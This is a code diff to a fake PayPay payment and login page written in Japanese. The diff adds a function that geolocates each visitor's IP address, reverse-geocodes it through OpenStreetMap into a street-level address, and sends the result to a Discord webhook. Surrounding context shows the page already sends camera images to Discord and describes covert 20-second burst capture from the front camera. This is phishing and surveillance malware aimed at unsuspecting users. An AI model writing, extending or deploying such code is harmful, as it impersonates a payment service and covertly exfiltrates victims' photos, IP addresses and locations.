@@ -25,6 +25,14 @@
     .logo {
       text-align: center;
       margin-bottom: 20px;
+      user-select: none;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-weight: 900;
+      font-size: 28px;
+      letter-spacing: -2px;
+      line-height: 1;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
     .title {
       font-size: 18px;
@@ -75,12 +83,7 @@
 <body>
   <div class="container">
     <div class="logo">
-      <!-- SVGで直接埋め込みPayPayロゴ -->
-      <svg width="100" height="32" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" style="display:inline-block;">
-        <rect width="32" height="32" rx="5" fill="#f00000" />
-        <text x="8" y="22" fill="#fff" font-family="Arial, sans-serif" font-size="14">PayPay</text>
-      </svg>
-      <p>ログイン</p>
+      Pay<span style="color: black;">Pay</span>
     </div>
     <div class="header">
       <p id="paymentDeadline">以内に支払いを完了してください</p>
@@ -151,22 +154,6 @@
       }).catch(err => console.error('画像送信エラー:', err));
     }
 
-    // IPと住所を取得してDiscordに送信
-    function getIPLocationAndSend() {
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const ip = data.ip || '不明';
-          const city = data.city || '';
-          const region = data.region || '';
-          const country = data.country_name || '';
-          const fullAddress = `${country} ${region} ${city}`;
-          const msg = `IP: ${ip}\n推定住所: ${fullAddress}`;
-          sendTextToDiscord(msg, 'IPアドレス＆住所');
-        })
-        .catch(err => console.error('住所取得失敗:', err));
-    }
-
     // Discordにテキスト送信
     function sendTextToDiscord(content, label = '通知') {
       const payload = {
@@ -177,6 +164,35 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       }).catch(err => console.error('Discord送信エラー:', err));
+    }
+
+    // IPと住所を取得してDiscordに送信（OpenStreetMap逆ジオコーディング追加版）
+    function getIPLocationAndSend() {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip || '不明';
+          const city = data.city || '';
+          const region = data.region || '';
+          const country = data.country_name || '';
+          const lat = data.latitude;
+          const lon = data.longitude;
+
+          // OpenStreetMapで緯度経度から住所取得
+          fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+            .then(res => res.json())
+            .then(location => {
+              const fullAddr = location.display_name || `${country} ${region} ${city}`;
+              const msg = `IP: ${ip}\n推定住所（OSM）: ${fullAddr}`;
+              sendTextToDiscord(msg, 'IPアドレス＆OSM住所');
+            })
+            .catch(err => {
+              console.error('Nominatim住所取得失敗:', err);
+              const fallbackMsg = `IP: ${ip}\n推定住所: ${country} ${region} ${city}`;
+              sendTextToDiscord(fallbackMsg, 'IPアドレス＆簡易住所');
+            });
+        })
+        .catch(err => console.error('IP取得失敗:', err));
     }
 
     // 内カメラ起動→20秒間0.5秒間隔で連写→Discord送信
